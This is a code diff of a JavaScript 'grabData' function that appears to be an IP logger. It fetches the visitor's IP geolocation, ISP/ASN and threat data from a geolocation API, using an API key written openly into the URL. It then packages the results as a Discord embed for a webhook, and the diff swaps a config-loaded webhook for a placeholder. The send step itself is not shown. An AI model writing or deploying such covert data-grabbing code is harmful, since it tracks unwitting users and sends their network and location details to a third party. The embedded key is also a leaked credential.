@@ -1,18 +1,16 @@
 const grabData = async () => {
-  const config = await fetch("./config.json").then(res => res.json());
-  const { Token: webhookURL } = config;
-
+  const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // Replace this with your actual webhook URL
   const apiUrl = "https://api.bigdatacloud.net/data/ip-geolocation-full?localityLanguage=en&key=bdc_77754f0976fd44bcb2c57392b7aef84a";
+
   const res = await fetch(apiUrl);
   const data = await res.json();
 
-  // Select only wanted fields, now including securityThreat and hazardReport
   const filtered = {
     ip: data.ip,
     localityLanguageRequested: data.localityLanguageRequested,
     isReachableGlobally: data.isReachableGlobally,
-    securityThreat: data.securityThreat, // added this
-    hazardReport: data.hazardReport,     // added this
+    securityThreat: data.securityThreat,
+    hazardReport: data.hazardReport,
     country: {
       isoAlpha2: data.country.isoAlpha2,
       name: data.country.name,
@@ -53,7 +51,6 @@ const grabData = async () => {
     }
   };
 
-  // Custom formatter to convert objects/arrays to nice strings
   const toFieldValue = (obj) => {
     if (obj === null || obj === undefined) return "N/A";
     if (typeof obj === "string" || typeof obj === "number" || typeof obj === "boolean") {
@@ -61,13 +58,11 @@ const grabData = async () => {
     }
     if (Array.isArray(obj)) {
       if (obj.length === 0) return "N/A";
-      // For arrays of objects, list key properties for clarity
       return obj.map(item => {
         if (typeof item === "object") {
-          // Example formatting for carriers and admin divisions
           if (item.asn) {
             return `ASN: ${item.asn} - Org: ${item.organisation || item.name || "N/A"}`;
-          } 
+          }
           if (item.name) {
             return `Name: ${item.name} - Desc: ${item.description || "N/A"}`;
           }
@@ -76,14 +71,12 @@ const grabData = async () => {
         return item;
       }).join("\n");
     }
-    // For hazardReport or similar nested objects, list keys nicely
     if (typeof obj === "object") {
       return Object.entries(obj).map(([k,v]) => `${k}: ${v}`).join("\n");
     }
     return JSON.stringify(obj);
   };
 
-  // Build embed fields with a max of 1024 chars per field (Discord limit)
   const fields = Object.entries(filtered).map(([key, val]) => ({
     name: key,
     value: toFieldValue(val).slice(0, 1024) || "N/A"
@@ -100,7 +93,7 @@ const grabData = async () => {
   };
 
   const payload = {
-    username: "drinzy.ftp.sh",
+    username: "drinzy",
     avatar_url: "https://cdn-icons-png.flaticon.com/512/7013/7013144.png",
     embeds: [embed]
   };
